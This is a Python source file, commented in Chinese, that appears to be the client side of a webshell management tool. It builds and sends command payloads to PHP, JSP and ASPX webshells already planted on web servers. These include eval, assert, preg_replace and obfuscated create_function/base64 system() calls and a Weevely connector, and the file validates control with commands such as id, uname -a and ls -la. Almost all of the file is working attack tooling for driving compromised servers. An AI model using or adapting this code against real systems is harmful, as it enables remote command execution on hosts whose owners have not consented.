import aiohttp
import asyncio
import base64
from typing import List, Dict, Any, Optional, Tuple, Callable
from loguru import logger
import time
from abc import ABC, abstractmethod
import json
import requests
from utils.models import ConnectionInfo
from dataclasses import dataclass

from .config import config

@dataclass
class CommandValidator:
    """命令验证器配置"""
    name: str  # 验证器名称
    command: str  # 测试命令
    validator: Callable[[str], bool]  # 验证函数
    error_msg: str  # 错误信息
    required: bool = True  # 是否必须成功

@dataclass
class WebshellFeature:
    """Webshell特征"""
    file_upload: bool = False
    command_exec: bool = False
    eval_usage: bool = False
    database_ops: bool = False
    obfuscated: bool = False

class OutputValidator:
    """输出验证器基类"""
    def __init__(self):
        # 通用错误模式
        self.error_patterns = [
            'Fatal error',
            'Parse error',
            'Warning:',
            'Notice:',
            'Uncaught Error',
            '<b>Error</b>',
            'Exception',
            'failed to open stream',
            'Call to undefined function'
        ]
        
        # HTML标签模式
        self.html_patterns = [
            '<br', '<b>', '</b>', '<html', '<head', '<body', '<div', '<p>'
        ]
        
        # 预定义的命令验证器
        self.command_validators = [
            CommandValidator(
                name="echo_test",
                command="echo 'test';",
                validator=lambda output: 'test' in output or self._check_file_creation(output),
                error_msg="echo test 命令执行失败",
                required=False
            ),
            CommandValidator(
                name="system_id",
                command="id;",
                validator=lambda output: 'uid=' in output.lower() or 'gid=' in output.lower() or self._check_file_creation(output),
                error_msg="id 命令执行失败",
                required=False
            ),
            CommandValidator(
                name="current_path",
                command="pwd;",
                validator=lambda output: any(path_part in output.lower() 
                    for path_part in ['/var/', '/home/', '/www/', 'c:\\', 'd:\\']) or self._check_file_creation(output),
                error_msg="pwd 命令执行失败",
                required=False
            )
        ]

    def _check_file_creation(self, output: str) -> bool:
        """检查是否是文件创建型webshell"""
        file_patterns = [
            r'\.php\b',  # PHP文件
            'file_put_contents',  # 文件写入函数
            'fwrite',  # 文件写入函数
            '%00',  # 空字节截断
            '%09',  # TAB字符截断
            '.jpg',  # 常见的伪装扩展名
            '.png',
            '.gif'
        ]
        return any(pattern.lower() in output.lower() for pattern in file_patterns)

    def _check_eval_usage(self, output: str) -> bool:
        """检查是否是eval型webshell"""
        eval_patterns = [
            '@eval',
            'eval(',
            'assert(',
            'call_user_func'
        ]
        return any(pattern.lower() in output.lower() for pattern in eval_patterns)

    def validate_output(self, output: str, features: WebshellFeature) -> Tuple[bool, str]:
        """验证输出是否有效"""
        if not output:
            return False, "空输出"

        # 如果是文件上传型webshell
        if features.file_upload and self._check_file_creation(output):
            return True, "文件创建型webshell"

        # 如果是eval型webshell
        if features.eval_usage and self._check_eval_usage(output):
            return True, "Eval型webshell"

        # 如果既不是文件上传也不是eval，那就必须是命令执行型
        if not (features.file_upload or features.eval_usage):
            # 检查是否包含错误信息
            if any(pattern.lower() in output.lower() for pattern in self.error_patterns):
                return False, f"输出包含错误信息: {output}"

            # 检查是否包含HTML标签
            if any(pattern.lower() in output.lower() for pattern in self.html_patterns):
                return False, f"输出包含HTML标签: {output}"

        return True, output

    def validate_command(self, command: str, output: str, features: WebshellFeature) -> Tuple[bool, str]:
        """验证特定命令的输出"""
        # 先进行通用验证
        success, msg = self.validate_output(output, features)
        if not success and not features.file_upload and not features.eval_usage:
            return False, msg

        # 查找对应的命令验证器
        for validator in self.command_validators:
            if validator.command == command:
                if not validator.validator(output) and validator.required:
                    return False, validator.error_msg
                break

        return True, output

    def add_command_validator(self, validator: CommandValidator):
        """添加新的命令验证器"""
        self.command_validators.append(validator)

    def add_error_pattern(self, pattern: str):
        """添加新的错误模式"""
        self.error_patterns.append(pattern)

    def add_html_pattern(self, pattern: str):
        """添加新的HTML标签模式"""
        self.html_patterns.append(pattern)

class BaseExecutor:
    """基础执行器类"""
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.logger = logger
        self.validator = OutputValidator()
    
    def _process_output(self, output: str) -> str:
        """处理命令输出"""
        if not output:
            return ""
        return output.strip()
    
    def _prepare_request(self, command: str, connection_info: ConnectionInfo) -> Dict[str, str]:
        """准备请求数据"""
        if connection_info.obfuscated:
            # 处理混淆的webshell
            return {
                connection_info.obfuscated_params['func_name']: 'create_function',
                connection_info.obfuscated_params['decode_func']: 'base64_decode',
                connection_info.obfuscated_params['param1']: base64.b64encode(''.encode()).decode(),
                connection_info.obfuscated_params['param2']: base64.b64encode(f"system('{command}');".encode()).decode(),
                connection_info.obfuscated_params['cmd_param']: base64.b64encode(''.encode()).decode()
            }
        elif connection_info.use_raw_post:
            # 使用原始POST数据
            return f"system('{command}');"
        elif connection_info.preg_replace:
            # preg_replace类型
            return {connection_info.param_name: f"echo system('{command}');"}
        elif connection_info.eval_usage:
            # eval类型
            return {connection_info.param_name: f"system('{command}');"}
        else:
            # 普通密码型
            data = {}
            if connection_info.password:
                data[connection_info.password_param] = connection_info.password
            if connection_info.param_name:
                data[connection_info.param_name] = command
            return data
    
    def execute_command(self, url: str, command: str, connection_info: ConnectionInfo) -> Tuple[bool, str]:
        """
        执行WebShell命令
        返回: (是否成功, 输出结果)
        """
        try:
            # 准备请求头和参数
            headers = {}
            data = self._prepare_request(command, connection_info)
            
            if connection_info.use_raw_post:
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                response = requests.post(url, headers=headers, data=data, timeout=self.timeout)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=self.timeout)
            
            # 处理响应
            if response.status_code != 200:
                return False, f"HTTP错误: {response.status_code}"
            
            output = self._process_output(response.text)
            
            # 验证输出
            success, msg = self.validator.validate_output(output, connection_info.features)
            if not success:
                return False, msg
            
            return True, output
            
        except requests.Timeout:
            return False, "请求超时"
        except requests.RequestException as e:
            return False, f"请求错误: {str(e)}"
        except Exception as e:
            return False, f"执行错误: {str(e)}"

class WebShellConnector(ABC):
    """WebShell连接器基类"""
    
    @abstractmethod
    async def execute(self, command: str, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """执行命令"""
        pass

class BaseConnector:
    """基础连接器类"""
    def prepare_request(self, command: str) -> Dict[str, str]:
        raise NotImplementedError()
        
    def process_response(self, response: str) -> str:
        return response.strip()

class PasswordConnector(BaseConnector):
    """密码型WebShell连接器"""
    def __init__(self, password: str = "test123", param_name: str = "cmd"):
        self.password = password
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        return {self.param_name: command}

class EvalConnector(BaseConnector):
    """Eval型WebShell连接器"""
    def __init__(self, param_name: str = "code"):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        php_code = f'system("{command}");'
        return {self.param_name: php_code}

class ParameterConnector(BaseConnector):
    """参数型WebShell连接器（用于JSP/ASPX）"""
    def __init__(self, param_name: str = "cmd"):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        return {self.param_name: command}

class WeevelyConnector(BaseConnector):
    """Weevely WebShell连接器"""
    def __init__(self, password: str):
        self.password = password
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        # Weevely使用特殊的编码方式
        encoded_cmd = base64.b64encode(command.encode()).decode()
        return {
            'pass': self.password,
            'cmd': encoded_cmd
        }
        
    def process_response(self, response: str) -> str:
        try:
            # Weevely的响应也是base64编码的
            return base64.b64decode(response).decode()
        except:
            return response

class CustomConnector(WebShellConnector):
    """自定义连接器"""
    def __init__(self, payload_template: str, **kwargs):
        self.payload_template = payload_template
        self.kwargs = kwargs
    
    async def execute(self, command: str, session: aiohttp.ClientSession) -> Dict[str, Any]:
        return {k: v.format(command=command) for k, v in self.kwargs.items()}

class AssertConnector(BaseConnector):
    """Assert型WebShell连接器"""
    def __init__(self, param_name: str = '_'):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        php_code = f'system("{command}");'
        return {self.param_name: php_code}

class WebShellExecutor:
    def __init__(self, url: str, connector: WebShellConnector):
        self.url = url
        self.connector = connector
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def execute_command(self, command: str) -> Dict[str, Any]:
        """执行单个命令"""
        start_time = time.time()
        try:
            # 获取请求数据
            data = await self.connector.execute(command, self.session)
            logger.debug(f"发送请求数据: {data}")
            
            # 发送请求
            async with self.session.post(self.url, data=data) as response:
                execution_time = time.time() - start_time
                content = await response.text()
                logger.debug(f"原始响应: {content}")
                
                try:
                    # 尝试解析JSON响应
                    result = json.loads(content)
                    if isinstance(result, dict):
                        if not result.get('success', False):
                            logger.error(f"WebShell执行错误: {result.get('error', '未知错误')}")
                            return {
                                'success': False,
                                'error': result.get('error', '未知错误'),
                                'execution_time': execution_time
                            }
                        
                        output = result.get('output', '')
                        if output:
                            try:
                                output = base64.b64decode(output).decode('utf-8')
                                logger.debug(f"解码后输出: {output}")
                            except Exception as e:
                                logger.error(f"Base64解码失败: {e}")
                        
                        return {
                            'success': True,
                            'output': output,
                            'execution_time': execution_time,
                            'status_code': response.status
                        }
                except json.JSONDecodeError:
                    # 如果不是JSON，尝试常规处理
                    output = content
                    try:
                        output = base64.b64decode(content).decode('utf-8')
                        logger.debug(f"解码后输出: {output}")
                    except Exception as e:
                        logger.error(f"Base64解码失败: {e}")
                        logger.debug(f"使用原始输出: {output}")
                    
                    success = response.status == 200 and output.strip() != ''
                    if not success:
                        logger.error(f"执行失败: status={response.status}, output={output}")
                    
                    return {
                        'success': success,
                        'output': output,
                        'execution_time': execution_time,
                        'status_code': response.status
                    }
                
        except Exception as e:
            logger.error(f"执行命令失败: {str(e)}")
            import traceback
            logger.debug(f"错误详情: {traceback.format_exc()}")
            return {
                'success': False,
                'error': str(e),
                'execution_time': time.time() - start_time
            }
    
    async def execute_commands(self, commands: List[str]) -> List[Dict[str, Any]]:
        """执行多个命令"""
        results = []
        for cmd in commands:
            result = await self.execute_command(cmd)
            results.append({
                'command': cmd,
                **result
            })
        return results

async def test_webshell(url: str, connection_info: ConnectionInfo, executor: BaseExecutor) -> Dict[str, Any]:
    """
    测试WebShell连接
    Args:
        url: WebShell URL
        connection_info: 连接信息
        executor: 执行器实例
    Returns:
        Dict包含测试结果
    """
    try:
        # 初始化结果字典
        result = {
            'success': False,
            'error': None,
            'details': None,
            'requests': [],  # 记录所有请求
            'responses': []  # 记录所有响应
        }

        # 创建异步HTTP会话
        async with aiohttp.ClientSession() as session:
            # 测试命令列表
            test_commands = [
                {
                    'name': 'echo_test',
                    'command': "echo 'WEBSHELL_TEST_STRING_123';",
                    'expected': 'WEBSHELL_TEST_STRING_123'
                },
                {
                    'name': 'system_info',
                    'command': "uname -a;",
                    'expected': None  # 不检查具体输出，只要有输出就行
                },
                {
                    'name': 'current_user',
                    'command': "id;",
                    'expected': 'uid='
                },
                {
                    'name': 'current_dir',
                    'command': "pwd;",
                    'expected': None  # 不检查具体输出，只要有输出就行
                },
                {
                    'name': 'list_files',
                    'command': "ls -la;",
                    'expected': None  # 不检查具体输出，只要有输出就行
                }
            ]

            # 测试每个命令
            for test in test_commands:
                try:
                    # 准备请求数据
                    request_data = {
                        'method': 'POST',
                        'url': url,
                        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                        'data': executor._prepare_request(test['command'], connection_info)
                    }
                    result['requests'].append({
                        'test_name': test['name'],
                        'command': test['command'],
                        **request_data
                    })

                    # 发送请求
                    logger.debug(f"发送请求: {request_data}")
                    async with session.post(
                        url,
                        headers=request_data['headers'],
                        data=request_data['data'],
                        timeout=executor.timeout
                    ) as response:
                        # 获取响应
                        response_text = await response.text()
                        response_data = {
                            'test_name': test['name'],
                            'command': test['command'],
                            'status': response.status,
                            'headers': dict(response.headers),
                            'body': response_text,
                            'success': False
                        }

                        # 验证响应
                        if response.status == 200:
                            logger.debug(f"响应: {response_text}")
                            output = executor._process_output(response_text)
                            if output:
                                if test['expected'] is None or test['expected'] in output:
                                    response_data['success'] = True
                                else:
                                    response_data['error'] = f"命令输出与预期不符: {output}"
                            else:
                                response_data['error'] = "命令没有输出"
                        else:
                            response_data['error'] = f"HTTP错误: {response.status}"

                        result['responses'].append(response_data)

                        # 如果是第一个测试（echo测试）失败，则认为整个测试失败
                        if test['name'] == 'echo_test' and not response_data['success']:
                            result['error'] = "基本命令执行测试失败"
                            result['details'] = response_data['error'] if 'error' in response_data else "未知错误"
                            return result

                except asyncio.TimeoutError:
                    result['error'] = f"命令执行超时: {test['name']}"
                    result['details'] = "请求超时"
                    return result
                except Exception as e:
                    result['error'] = f"命令执行错误: {test['name']}"
                    result['details'] = str(e)
                    return result

            # 检查测试结果
            successful_tests = sum(1 for resp in result['responses'] if resp['success'])
            total_tests = len(test_commands)
            
            # 如果至少有3个测试成功，就认为整体测试成功
            if successful_tests >= 3:
                result['success'] = True
                result['details'] = f"成功执行 {successful_tests}/{total_tests} 个测试命令"
            else:
                result['error'] = "大部分命令执行测试失败"
                result['details'] = f"只有 {successful_tests}/{total_tests} 个测试命令成功执行"

            return result

    except Exception as e:
        result['error'] = "测试过程发生错误"
        result['details'] = str(e)
        return result

# 预定义的连接器工厂
def create_connector(shell_type: str, **kwargs) -> BaseConnector:
    """创建对应类型的连接器"""
    connectors = {
        'password': PasswordConnector,
        'eval': EvalConnector,
        'parameter': ParameterConnector,
        'weevely': WeevelyConnector,
        'assert': AssertConnector
    }
    
    if shell_type not in connectors:
        raise ValueError(f"不支持的WebShell类型: {shell_type}")
        
    return connectors[shell_type](**kwargs)
